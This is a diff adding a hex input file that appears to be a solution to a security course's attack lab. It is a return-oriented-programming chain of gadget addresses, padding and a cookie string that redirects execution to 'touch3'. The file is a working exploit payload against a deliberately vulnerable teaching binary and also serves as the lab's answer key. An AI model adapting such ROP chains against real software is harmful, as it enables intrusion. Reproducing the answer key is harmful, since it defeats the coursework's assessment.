@@ -1,0 +1,15 @@
+00 00 00 00 00 00 00 00 /* padding */
+00 00 00 00 00 00 00 00 /* padding */  
+00 00 00 00 00 00 00 00 /* padding */  
+00 00 00 00 00 00 00 00 /* padding */  
+00 00 00 00 00 00 00 00 /* padding */  
+06 1a 40 00 00 00 00 00 /* gadget 1: movq %rsp, %rax */
+a2 19 40 00 00 00 00 00 /* gadget 2: movq %rax, %rdi */
+b9 19 40 00 00 00 00 00 /* gadget 3: popq %rax; xchg %eax, %edx */
+40 00 00 00 00 00 00 00 /* gap between gadget 1 and cookie */
+69 1a 40 00 00 00 00 00 /* gadget 4: movq %edx, %ecx; or bl, bl */
+13 1a 40 00 00 00 00 00 /* gadget 5: movq %ecx, %esi */
+d6 19 40 00 00 00 00 00 /* gadget 6: lea (%rdi, %rsi, 1), rax */
+a2 19 40 00 00 00 00 00 /* gadget 7: movq %rax, %rdi */
+fa 18 40 00 00 00 00 00 /* return address of touch3 */
+35 39 62 39 39 37 66 61 /* cookie */
